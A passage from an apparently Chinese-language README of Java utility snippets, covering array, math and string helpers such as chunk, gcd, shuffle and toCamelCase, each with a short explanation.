[`initializeArrayWithValues`](#initializearraywithvalues)\n* [`intersection`](#intersection)\n* [`isSorted`](#issorted)\n* [`join`](#join)\n* [`nthElement`](#nthelement)\n* [`pick`](#pick)\n* [`reducedFilter`](#reducedfilter)\n* [`remove`](#remove)\n* [`sample`](#sample)\n* [`sampleSize`](#samplesize)\n* [`shuffle`](#shuffle)\n* [`similarity`](#similarity)\n* [`sortedIndex`](#sortedindex)\n* [`symmetricDifference`](#symmetricdifference)\n* [`tail`](#tail)\n* [`take`](#take)\n* [`takeRight`](#takeright)\n* [`union`](#union)\n* [`without`](#without)\n* [`zip`](#zip)\n* [`zipObject`](#zipobject)\n\n</details>\n\n### ➗ Math (数学相关)\n\n<details>\n<summary>详细信息</summary>\n\n* [`average`](#average)\n* [`gcd`](#gcd)\n* [`lcm`](#lcm)\n* [`findNextPositivePowerOfTwo`](#findnextpositivepoweroftwo)\n* [`isEven`](#iseven)\n* [`isPowerOfTwo`](#ispoweroftwo)\n* [`generateRandomInt`](#generaterandomint)\n\n</details>\n\n### 📜 String (字符串相关)\n\n<details>\n<summary>详细信息</summary>\n\n* [`anagrams`](#anagrams)\n* [`byteSize`](#bytesize)\n* [`capitalize`](#capitalize)\n* [`capitalizeEveryWord`](#capitalizeeveryword)\n* [`countVowels`](#countvowels)\n* [`escapeRegExp`](#escaperegexp)\n* [`fromCamelCase`](#fromcamelcase)\n* [`isAbsoluteURL`](#isabsoluteurl)\n* [`isLowerCase`](#islowercase)\n* [`isUpperCase`](#isuppercase)\n* [`isPalindrome`](#ispalindrome)\n* [`isNumeric`](#isnumeric)\n* [`mask`](#mask)\n* [`reverseString`](#reversestring)\n* [`sortCharactersInString`](#sortcharactersinstring)\n* [`splitLines`](#splitlines)\n* [`toCamelCase`](#tocamelcase)\n* [`toKebabCase`](#tokebabcase)\n* [`match`](#match)\n* [`toSnakeCase`](#tosnakecase)\n* [`truncateString`](#truncatestring)\n* [`words`](#words)\n* [`stringToIntegers`](#stringtointegers)\n\n</details>\n\n### ⭕️ IO (IO流相关)\n\n<details>\n<summary>详细信息</summary>\n\n* [`convertInputStreamToString`](#convertinputstreamtostring)\n* [`readFileAsString`](#readfileasstring)\n* [`getCurrentWorkingDirectoryPath`](#getcurrentworkingdirectorypath)\n* [`tmpDirName`](#tmpdirname)\n\n</details>\n\n### ❌ Exception (异常相关)\n\n<details>\n<summary>详细信息</summary>\n\n* [`stackTraceAsString`](#stacktraceasstring)\n\n</details>\n\n### 🖥 System (系统相关)\n\n<details>\n<summary>详细信息</summary>\n\n- [`osName`](#osname)\n- [`isDebuggerEnabled`](#isdebuggerenabled)\n\n</details>\n\n### 💡 Class (类相关)\n\n<details>\n<summary>详细信息</summary>\n\n- [`getAllInterfaces`](#getallinterfaces)\n- [`IsInnerClass`](#isinnerclass)\n\n</details>\n\n### 💎 Enum (枚举相关)\n\n<details>\n<summary>详细信息</summary>\n\n- [`getEnumMap`](#getenummap)\n\n</details>\n\n## Array\n\n### chunk\n\n将数组分割成特定大小的小数组。\n\n```java\npublic static int[][] chunk(int[] numbers, int size) {\n    return IntStream.iterate(0, i -> i + size)\n            .limit((long) Math.ceil((double) numbers.length / size))\n            .mapToObj(cur -> Arrays.copyOfRange(numbers, cur, cur + size > numbers.length ? numbers.length : cur + size))\n            .toArray(int[][]::new);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### concat\n\n```java\npublic static <T> T[] concat(T[] first, T[] second) {\n    return Stream.concat(\n            Stream.of(first),\n            Stream.of(second)\n    ).toArray(i -> (T[]) Arrays.copyOf(new Object[0], i, first.getClass()));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### countOccurrences\n\n计算数组中某个值出现的次数。\n\n使用 `Arrays.stream().filter().count()` 计算等于指定值的值的总数。\n\n```java\npublic static long countOccurrences(int[] numbers, int value) {\n    return Arrays.stream(numbers)\n            .filter(number -> number == value)\n            .count();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### deepFlatten\n\n数组扁平化。\n\n使用递归实现，`Arrays.stream().flatMapToInt()`\n\n```java\npublic static int[] deepFlatten(Object[] input) {\n    return Arrays.stream(input)\n            .flatMapToInt(o -> {\n                if (o instanceof Object[]) {\n                    return Arrays.stream(deepFlatten((Object[]) o));\n                }\n                return IntStream.of((Integer) o);\n            }).toArray();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### difference\n\n返回两个数组之间的差异。\n\n从 b 中创建一个集合，然后在 a 上使用 `Arrays.stream().filter()` 只保留 b 中不包含的值。\n\n```java\npublic static int[] difference(int[] first, int[] second) {\n    Set<Integer> set = Arrays.stream(second).boxed().collect(Collectors.toSet());\n    return Arrays.stream(first)\n            .filter(v -> !set.contains(v))\n            .toArray();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### differenceWith\n\n从比较器函数不返回true的数组中筛选出所有值。\n\nint的比较器是使用IntbinaryPerator函数来实现的。\n\n使用 `Arrays.stream().filter()` 和 `Arrays.stream().noneMatch()` 查找相应的值。\n\n```java\npublic static int[] differenceWith(int[] first, int[] second, IntBinaryOperator comparator) {\n    return Arrays.stream(first)\n            .filter(a ->\n                    Arrays.stream(second)\n                            .noneMatch(b -> comparator.applyAsInt(a, b) == 0)\n            ).toArray();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### distinctValuesOfArray\n\n返回数组的所有不同值。 \n\n使用 `Arrays.stream().distinct()` 去除所有重复的值。\n\n```java\npublic static int[] distinctValuesOfArray(int[] elements) {\n    return Arrays.stream(elements).distinct().toArray();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### dropElements\n\n移除数组中的元素，直到传递的函数返回true为止。返回数组中的其余元素。 \n\n使用数组循环遍历数组，将数组的第一个元素删除，直到函数返回的值为真为止。返回其余的元素。\n\n```java\npublic static int[] dropElements(int[] elements, IntPredicate condition) {\n    while (elements.length > 0 && !condition.test(elements[0])) {\n        elements = Arrays.copyOfRange(elements, 1, elements.length);\n    }\n    return elements;\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### dropRight\n\n返回一个新数组，从右边移除n个元素。 \n\n检查n是否短于给定的数组，并使用 `Array.copyOfRange()` 以便对其进行相应的切片或返回一个空数组。\n\n```java\npublic static int[] dropRight(int[] elements, int n) {\n    if (n < 0) {\n        throw new IllegalArgumentException(\"n is less than 0\");\n    }\n    return n < elements.length\n            ? Arrays.copyOfRange(elements, 0, elements.length - n)\n            : new int[0];\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### everyNth\n\n返回数组中的每个第n个元素。 \n\n使用 `IntStream.range().filter()` 创建一个新数组，该数组包含给定数组的每个第n个元素。\n\n```java\npublic static int[] everyNth(int[] elements, int nth) {\n     return IntStream.range(0, elements.length)\n             .filter(i -> i % nth == nth - 1)\n             .map(i -> elements[i])\n             .toArray();\n }\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### indexOf\n\n查找数组中元素的索引，在不存在元素的情况下返回-1。 \n\n使用 `IntStream.range().filter()` 查找数组中元素的索引。\n\n```java\npublic static int indexOf(int[] elements, int el) {\n    return IntStream.range(0, elements.length)\n            .filter(idx -> elements[idx] == el)\n            .findFirst()\n            .orElse(-1);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### lastIndexOf\n\n查找数组中元素的最后索引，在不存在元素的情况下返回-1。 \n\n使用 `IntStream.iterate().limit().filter()` 查找数组中元素的索引。\n\n```java\npublic static int lastIndexOf(int[] elements, int el) {\n    return IntStream.iterate(elements.length - 1, i -> i - 1)\n            .limit(elements.length)\n            .filter(idx -> elements[idx] == el)\n            .findFirst()\n            .orElse(-1);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### filterNonUnique\n\n筛选出数组中的非唯一值。 \n\n对只包含唯一值的数组使用 `Arrays.stream().filter()`。\n\n```java\npublic static int[] filterNonUnique(int[] elements) {\n    return Arrays.stream(elements)\n            .filter(el -> indexOf(elements, el) == lastIndexOf(elements, el))\n            .toArray();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### flatten\n\n使数组扁平。\n\n使用 `Arrays.stream().flatMapToInt().toArray()` 创建一个新数组。\n\n\n```java\npublic static int[] flatten(Object[] elements) {\n    return Arrays.stream(elements)\n            .flatMapToInt(el -> el instanceof int[]\n                    ? Arrays.stream((int[]) el)\n                    : IntStream.of((int) el)\n            ).toArray();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### flattenDepth\n\n将数组压平到指定的深度。\n\n```java\npublic static Object[] flattenDepth(Object[] elements, int depth) {\n    if (depth == 0) {\n        return elements;\n    }\n    return Arrays.stream(elements)\n            .flatMap(el -> el instanceof Object[]\n                    ? Arrays.stream(flattenDepth((Object[]) el, depth - 1))\n                    : Arrays.stream(new Object[]{el})\n            ).toArray();\n\n\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### groupBy\n\n根据给定函数对数组元素进行分组。\n\n使用 `Arrays.stream().collect(Collectors.groupingBy())` 分组。\n\n```java\npublic static <T, R> Map<R, List<T>> groupBy(T[] elements, Function<T, R> func) {\n    return Arrays.stream(elements).collect(Collectors.groupingBy(func));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### initial\n\n返回数组中除去最后一个的所有元素。\n\n使用 `Arrays.copyOfRange()` 返回除最后一个之外的所有元素。\n\n```java\npublic static <T> T[] initial(T[] elements) {\n    return Arrays.copyOfRange(elements, 0, elements.length - 1);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### initializeArrayWithRange\n\n初始化一个数组，该数组包含在指定范围内的数字，传入 `start` 和 `end`。\n\n```java\npublic static int[] initializeArrayWithRange(int end, int start) {\n    return IntStream.rangeClosed(start, end).toArray();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### initializeArrayWithValues\n\n使用指定的值初始化并填充数组。\n\n```java\npublic static int[] initializeArrayWithValues(int n, int value) {\n    return IntStream.generate(() -> value).limit(n).toArray();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### intersection\n\n返回两个数组中存在的元素列表。 \n\n从第二步创建一个集合，然后在 a 上使用 `Arrays.stream().filter()` 来保存包含在 b 中的值。\n\n```java\npublic static int[] intersection(int[] first, int[] second) {\n    Set<Integer> set = Arrays.stream(second).boxed().collect(Collectors.toSet());\n    return Arrays.stream(first)\n            .filter(set::contains)\n            .toArray();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### isSorted\n\n如果数组按升序排序，则返回 `1`，如果数组按降序排序，返回 `-1`，如果没有排序，则返回 `0`。\n\n计算前两个元素的排序 `direction`。使用for循环对数组进行迭代，并对它们进行成对比较。如果 `direction` 发生变化，则返回 `0`，\n如果到达最后一个元素，则返回 `direction`。\n\n```java\npublic static <T extends Comparable<? super T>> int isSorted(T[] arr) {\n    final int direction = arr[0].compareTo(arr[1]) < 0 ? 1 : -1;\n    for (int i = 0; i < arr.length; i++) {\n        T val = arr[i];\n        if (i == arr.length - 1) return direction;\n        else if ((val.compareTo(arr[i + 1]) * direction > 0)) return 0;\n    }\n    return direction;\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### join\n\n将数组的所有元素连接到字符串中，并返回此字符串。\n\n使用 `IntStream.range` 创建一个指定索引的数组。然后，使用 `Stream.reduce` 将元素组合成字符串。\n\n```java\npublic static <T> String join(T[] arr, String separator, String end) {\n    return IntStream.range(0, arr.length)\n            .mapToObj(i -> new SimpleEntry<>(i, arr[i]))\n            .reduce(\"\", (acc, val) -> val.getKey() == arr.length - 2\n                    ? acc + val.getValue() + end\n                    : val.getKey() == arr.length - 1 ? acc + val.getValue() : acc + val.getValue() + separator, (fst, snd) -> fst);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### nthElement\n\n返回数组的第n个元素。\n\nUse `Arrays.copyOfRange()` 优先得到包含第n个元素的数组。 \n\n```Java\npublic static <T> T nthElement(T[] arr, int n) {\n    if (n > 0) {\n        return Arrays.copyOfRange(arr, n, arr.length)[0];\n    }\n    return Arrays.copyOfRange(arr, arr.length + n, arr.length)[0];\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### pick\n\n从对象中选择与给定键对应的键值对。\n\n使用 `Arrays.stream` 过滤 `arr` 中存在的所有键。然后，使用 `Collectors.toMap` 将所有的key转换为Map。\n\n```java\npublic static <T, R> Map<T, R> pick(Map<T, R> obj, T[] arr) {\n    return Arrays.stream(arr)\n            .filter(obj::containsKey)\n            .collect(Collectors.toMap(k -> k, obj::get));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### reducedFilter\n\n根据条件筛选对象数组，同时筛选出未指定的键。\n\n使用 `Arrays.stream().filter()` 根据谓词 `fn` 过滤数组，以便返回条件为真的对象。\n对于每个过滤的Map对象，创建一个新的Map，其中包含 `keys` 中的键。最后，将Map对象收集到一个数组中。\n\n```java\npublic static Map<String, Object>[] reducedFilter(Map<String, Object>[] data, String[] keys, Predicate<Map<String, Object>> fn) {\n    return Arrays.stream(data)\n            .filter(fn)\n            .map(el -> Arrays.stream(keys).filter(el::containsKey)\n                    .collect(Collectors.toMap(Function.identity(), el::get)))\n            .toArray((IntFunction<Map<String, Object>[]>) Map[]::new);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### sample\n\n从数组中返回一个随机元素。\n\n使用 `Math.Randoman()` 生成一个随机数，然后将它乘以数组的 `length`，然后使用 `Math.floor()` 获得一个最近的整数，该方法也适用于字符串。\n\n```java\npublic static <T> T sample(T[] arr) {\n    return arr[(int) Math.floor(Math.random() * arr.length)];\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### sampleSize\n\n从 `array` 到 `array` 大小的唯一键获取 `n` 个随机元素。\n\n根据[Fisher-Yates算法](https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle)，使用 `Array.copyOfRange()` 获得优先的 `n` 个元素。\n\n```java\npublic static <T> T[] sampleSize(T[] input, int n) {\n    T[] arr = Arrays.copyOf(input, input.length);\n    int length = arr.length;\n    int m = length;\n    while (m > 0) {\n        int i = (int) Math.floor(Math.random() * m--);\n        T tmp = arr[i];\n        arr[i] = arr[m];\n        arr[m] = tmp;\n    }\n    return Arrays.copyOfRange(arr, 0, n > length ? length : n);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### shuffle\n\n将数组值的顺序随机化，返回一个新数组。\n\n根据 [Fisher-Yates 算法](https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle) 重新排序数组的元素。\n\n```java\npublic static <T> T[] shuffle(T[] input) {\n    T[] arr = Arrays.copyOf(input, input.length);\n    int length = arr.length;\n    int m = length;\n    while (m > 0) {\n        int i = (int) Math.floor(Math.random() * m--);\n        T tmp = arr[i];\n        arr[i] = arr[m];\n        arr[m] = tmp;\n    }\n    return arr;\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### similarity\n\n返回出现在两个数组中的元素数组。\n\n使用 `Arrays.stream().filter()` 移除，然后使用 `Arrays.stream().anyMatch()` 匹配 `second` 部分的值。\n\n```java\npublic static <T> T[] similarity(T[] first, T[] second) {\n    return Arrays.stream(first)\n            .filter(a -> Arrays.stream(second).anyMatch(b -> Objects.equals(a, b)))\n            // Make a new array of first's runtime type, but empty content:\n            .toArray(i -> (T[]) Arrays.copyOf(new Object[0], i, first.getClass()));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### sortedIndex\n\n返回值应该插入到数组中的最低索引，以保持其排序顺序。\n\n检查数组是否按降序（松散地）排序。 使用 `IntStream.range().filter()` 来找到元素应该被插入的合适的索引。\n\n```java\npublic static <T extends Comparable<? super T>> int sortedIndex(T[] arr, T el) {\n    boolean isDescending = arr[0].compareTo(arr[arr.length - 1]) > 0;\n    return IntStream.range(0, arr.length)\n            .filter(i -> isDescending ? el.compareTo(arr[i]) >= 0 : el.compareTo(arr[i]) <= 0)\n            .findFirst()\n            .orElse(arr.length);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### symmetricDifference\n\n返回两个数组之间的对称差异。\n\n从每个数组中创建一个 `Set`，然后使用 `Arrays.stream().filter()` 来保持其他值不包含的值。最后，连接两个数组并创建一个新数组并返回。\n\n```java\npublic static <T> T[] symmetricDifference(T[] first, T[] second) {\n    Set<T> sA = new HashSet<>(Arrays.asList(first));\n    Set<T> sB = new HashSet<>(Arrays.asList(second));\n\n    return Stream.concat(\n            Arrays.stream(first).filter(a -> !sB.contains(a)),\n            Arrays.stream(second).filter(b -> !sA.contains(b))\n    ).toArray(i -> (T[]) Arrays.copyOf(new Object[0], i, first.getClass()));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### tail\n\n返回数组中除第一个元素外的所有元素。\n\n如果数组的长度大于1，则返回 `Arrays.copyOfRange(1)`，否则返回整个数组。\n\n```java\npublic static <T> T[] tail(T[] arr) {\n    return arr.length > 1\n            ? Arrays.copyOfRange(arr, 1, arr.length)\n            : arr;\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### take\n\n返回一个从开头删除n个元素的数组。\n\n```java\npublic static <T> T[] take(T[] arr, int n) {\n    return Arrays.copyOfRange(arr, 0, n);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### takeRight\n\n返回从末尾移除n个元素的数组。\n\n使用 `Arrays.copyOfRange()` 用从末尾取来的 `N` 个元素来创建一个数组。\n\n```java\npublic static <T> T[] takeRight(T[] arr, int n) {\n    return Arrays.copyOfRange(arr, arr.length - n, arr.length);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### union\n\n返回两个数组中任何一个中存在的每个元素一次。\n\n使用 `a` 和 `b` 的所有值创建一个 `Set`，并将其转换为数组。\n\n```Java\npublic static <T> T[] union(T[] first, T[] second) {\n    Set<T> set = new HashSet<>(Arrays.asList(first));\n    set.addAll(Arrays.asList(second));\n    return set.toArray((T[]) Arrays.copyOf(new Object[0], 0, first.getClass()));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### without\n\n筛选出具有指定值之一的数组的元素。\n\n使用 `Arrays.strean().filter()` 创建一个数组，排除(使用 `!Arrays.asList(elements).contains()`)所有命中的值。\n\n```java\npublic static <T> T[] without(T[] arr, T... elements) {\n    List<T> excludeElements = Arrays.asList(elements);\n    return Arrays.stream(arr)\n            .filter(el -> !excludeElements.contains(el))\n            .toArray(i -> (T[]) Arrays.copyOf(new Object[0], i, arr.getClass()));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### zip\n\n根据原始数组中的位置创建元素数组。\n\n```java\npublic static List<Object[]> zip(Object[]... arrays) {\n    OptionalInt max = Arrays.stream(arrays).mapToInt(arr -> arr.length).max();\n    return IntStream.range(0, max.getAsInt())\n            .mapToObj(i -> Arrays.stream(arrays)\n                    .map(arr -> i < arr.length ? arr[i] : null)\n                    .toArray())\n            .collect(Collectors.toList());\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### zipObject\n\n给定有效的属性标识符数组和值数组，返回将属性与值关联的对象。\n\n```java\npublic static Map<String, Object> zipObject(String[] props, Object[] values) {\n    return IntStream.range(0, props.length)\n            .mapToObj(i -> new SimpleEntry<>(props[i], i < values.length ? values[i] : null))\n            .collect(\n                    HashMap::new, (m, v) -> m.put(v.getKey(), v.getValue()), HashMap::putAll);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n## Maths\n\n### average\n\n返回两个或两个以上数字的平均值。\n\n```java\npublic static double average(int[] arr) {\n    return IntStream.of(arr)\n            .average()\n            .orElseThrow(() -> new IllegalArgumentException(\"Array is empty\"));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### gcd\n\n计算一系列数字的最大公约数(gcd)。\n\n使用 `Arrays.stream().reduce()` 和 GCD（使用递归公式）计算一组数字的最大公约数。\n\n```java\npublic static OptionalInt gcd(int[] numbers) {\n    return Arrays.stream(numbers)\n            .reduce((a, b) -> gcd(a, b));\n}\n\nprivate static int gcd(int a, int b) {\n    if (b == 0) {\n        return a;\n    }\n    return gcd(b, a % b);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### lcm\n\n计算数字数组的最低公共倍数(LCM)。\n\n使用 `Arrays.stream().reduce()` 和 LCM公式(使用递归)来计算数字数组的最低公共倍数。\n\n```java\npublic static OptionalInt lcm(int[] numbers) {\n    IntBinaryOperator lcm = (x, y) -> (x * y) / gcd(x, y);\n    return Arrays.stream(numbers)\n            .reduce((a, b) -> lcm.applyAsInt(a, b));\n}\n\nprivate static int gcd(int a, int b) {\n    if (b == 0) {\n        return a;\n    }\n    return gcd(b, a % b);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### findNextPositivePowerOfTwo\n\n查找大于或等于该值的下一个幂。\n\n该方法使用左移运算符将1与右侧的值位移。右侧使用 `Integer.numberOfLeadingZeros`方法。\n`001 << 2` would be `100`. `100` in decimal is equal to `4`.\n\n`Integer.numberOfLeadingZeros` 给出了数值前导零的数目。例如，调用 `Integer.numberOfLeadingZeros(3)` 将赋值为30。\n这是因为3在二进制中表示为 `11`。由于整数有32位，所以有30位有0位。左移运算符的右边变为 `32-30 = 2`。\n左移1，即 `001 << 2` 将是 `100`，十进制中的 `100` 等于 `4`。\n\n```java\npublic static int findNextPositivePowerOfTwo(int value) {\n    return 1 << (32 - Integer.numberOfLeadingZeros(value - 1));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### isEven\n\n检查数字是否是偶数。\n\n这个方法使用按位运算符，`0b1` 是1的二进制表示。\n因为Java 7可以通过用 `0b` 或 `0B` 作为前缀来编写二进制文字。\n数字为偶数时，`＆` 运算符将返回0。 例如，`IsEven(4)` 会导致 `100` `&` `001`，`＆` 的结果将是 `000`。\n\n```java\npublic static boolean isEven(final int value) {\n    return (value & 0b1) == 0;\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### isPowerOfTwo\n\n检查一个值是2的正幂。\n\n为了理解它是如何工作的，让我们假设我们调用了 `IsPowerOfTwo(4)`。\n\n当值大于0时，将评估 `&&` 运算符的右侧。\n\n`(~value + 1)` 的结果等于值本身，`~100 + 001` => `011 + 001` => `100`。\n\n`(value & value)` 的结果是value，`100` & `100` => `100`.。\n\n当值等于值时，这将把值表达为真值。\n\n```Java\npublic static boolean isPowerOfTwo(final int value) {\n    return value > 0 && ((value & (~value + 1)) == value);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### generateRandomInt\n\n生成一个介于 `Integer.MIN_VALUE` 和 `Integer.MAX_VALUE` 之间的随机数。\n\n```java\npublic static int generateRandomInt() {\n    return ThreadLocalRandom.current().nextInt();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n## String\n\n### anagrams\n\n生成一个字符串的所有字符（包含重复）。\n\n```java\npublic static List<String> anagrams(String input) {\n    if (input.length() <= 2) {\n        return input.length() == 2\n                ? Arrays.asList(input, input.substring(1) + input.substring(0, 1))\n                : Collections.singletonList(input);\n    }\n    return IntStream.range(0, input.length())\n            .mapToObj(i -> new SimpleEntry<>(i, input.substring(i, i + 1)))\n            .flatMap(entry ->\n                    anagrams(input.substring(0, entry.getKey()) + input.substring(entry.getKey() + 1))\n                            .stream()\n                            .map(s -> entry.getValue() + s))\n            .collect(Collectors.toList());\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### byteSize\n\n以字节为单位返回字符串的长度。\n\n```java\npublic static int byteSize(String input) {\n    return input.getBytes().length;\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### capitalize\n\n将字符串首字母大写。\n\n```Java\npublic static String capitalize(String input, boolean lowerRest) {\n    return input.substring(0, 1).toUpperCase() +\n            (lowerRest\n                    ? input.substring(1, input.length()).toLowerCase()\n                    : input.substring(1, input.length()));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### capitalizeEveryWord\n\n将字符串中每个单词的首字母大写。\n\n```java\npublic static String capitalizeEveryWord(final String input) {\n    return Pattern.compile(\"\\\\b(?=\\\\w)\").splitAsStream(input)\n            .map(w -> capitalize(w, false))\n            .collect(Collectors.joining());\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### countVowels\n\n在提供的字符串中返回元音的个数。\n\n```java\npublic static int countVowels(String input) {\n    return input.replaceAll(\"[^aeiouAEIOU]\", \"\").length();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### escapeRegExp\n\n转义要在正则表达式中使用的字符串。\n\n```java\npublic static String escapeRegExp(String input) {\n    return Pattern.quote(input);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### fromCamelCase\n\n从驼峰式转换字符串。\n\n```java\npublic static String fromCamelCase(String input, String separator) {\n    return input\n            .replaceAll(\"([a-z\\\\d])([A-Z])\", \"$1\" + separator + \"$2\")\n            .toLowerCase();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### isAbsoluteUrl\n\n如果给定的字符串是绝对URL，则返回 `true`，否则返回 `false`。\n\n```java\npublic static boolean isAbsoluteUrl(String url) {\n    return Pattern.compile(\"^[a-z][a-z0-9+.-]*:\").matcher(url).find();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### isLowerCase\n\n检查字符串是否为小写。\n\n```java\npublic static boolean isLowerCase(String input) {\n    return Objects.equals(input, input.toLowerCase());\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### isUpperCase\n\n检查字符串是否为大写。\n\n```java\npublic static boolean isUpperCase(String input) {\n    return Objects.equals(input, input.toUpperCase());\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### isPalindrome\n\n判断一个字符串是否回文。\n\n```java\npublic static boolean isPalindrome(String input) {\n    String s = input.toLowerCase().replaceAll(\"[\\\\W_]\", \"\");\n    return Objects.equals(\n            s,\n            new StringBuilder(s).reverse().toString()\n    );\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### isNumeric\n\n检查字符串是否为数字。\n\n```java\npublic static boolean isNumeric(final String input) {\n    return IntStream.range(0, input.length())\n            .allMatch(i -> Character.isDigit(input.charAt(i)));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### mask\n\n用指定的掩码字符替换除最后 `num` 个字符以外的所有字符。\n\n```Java\npublic static String mask(String input, int num, String mask) {\n    int length = input.length();\n    return num > 0\n            ?\n            input.substring(0, length - num).replaceAll(\".\", mask)\n                    + input.substring(length - num)\n            :\n            input.substring(0, Math.negateExact(num))\n                    + input.substring(Math.negateExact(num), length).replaceAll(\".\", mask);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### reverseString\n\n反转字符串。\n\n```java\npublic static String reverseString(String input) {\n    return new StringBuilder(input).reverse().toString();\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### sortCharactersInString\n\n按字母顺序排列字符串中的字符。\n\n```java\npublic static String sortCharactersInString(String input) {\n    return Arrays.stream(input.split(\"\")).sorted().collect(Collectors.joining());\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### splitLines\n\n将多行字符串拆分为行数组。\n\n```java\npublic static String[] splitLines(String input) {\n    return input.split(\"\\\\r?\\\\n\");\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### toCamelCase\n\n转换一个字符串为驼峰式。\n\n```java\npublic static String toCamelCase(String input) {\n    Matcher matcher = Pattern.compile(\"[A-Z]{2,}(?=[A-Z][a-z]+[0-9]*|\\\\b)|[A-Z]?[a-z]+[0-9]*|[A-Z]|[0-9]+\").matcher(input);\n    List<String> matchedParts = new ArrayList<>();\n    while (matcher.find()) {\n        matchedParts.add(matcher.group(0));\n    }\n    String s = matchedParts.stream()\n            .map(x -> x.substring(0, 1).toUpperCase() + x.substring(1).toLowerCase())\n            .collect(Collectors.joining());\n    return s.substring(0, 1).toLowerCase() + s.substring(1);\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### toKebabCase\n\n将字符串转换为kebab大小写。\n\n```java\npublic static String toKebabCase(String input) {\n    Matcher matcher = Pattern.compile(\"[A-Z]{2,}(?=[A-Z][a-z]+[0-9]*|\\\\b)|[A-Z]?[a-z]+[0-9]*|[A-Z]|[0-9]+\").matcher(input);\n    List<String> matchedParts = new ArrayList<>();\n    while (matcher.find()) {\n        matchedParts.add(matcher.group(0));\n    }\n    return matchedParts.stream()\n            .map(String::toLowerCase)\n            .collect(Collectors.joining(\"-\"));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### match\n\n正则匹配。\n\n```java\npublic static List<String> match(String input, String regex) {\n    Matcher matcher = Pattern.compile(regex).matcher(input);\n    List<String> matchedParts = new ArrayList<>();\n    while (matcher.find()) {\n        matchedParts.add(matcher.group(0));\n    }\n    return matchedParts;\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### toSnakeCase\n\n将字符串转换为蛇形小写，如 `Im_Biezhi`。\n\n```java\npublic static String toSnakeCase(String input) {\n    Matcher matcher = Pattern.compile(\"[A-Z]{2,}(?=[A-Z][a-z]+[0-9]*|\\\\b)|[A-Z]?[a-z]+[0-9]*|[A-Z]|[0-9]+\").matcher(input);\n    List<String> matchedParts = new ArrayList<>();\n    while (matcher.find()) {\n        matchedParts.add(matcher.group(0));\n    }\n    return matchedParts.stream()\n            .map(String::toLowerCase)\n            .collect(Collectors.joining(\"_\"));\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### truncateString\n\n将字符串截断到指定的长度。\n\n```java\npublic static String truncateString(String input, int num) {\n    return input.length() > num\n            ? input.substring(0, num > 3 ? num - 3 : num) + \"...\"\n            : input;\n}\n```\n\n<br>[⬆ 回到顶部](#目录)\n\n### 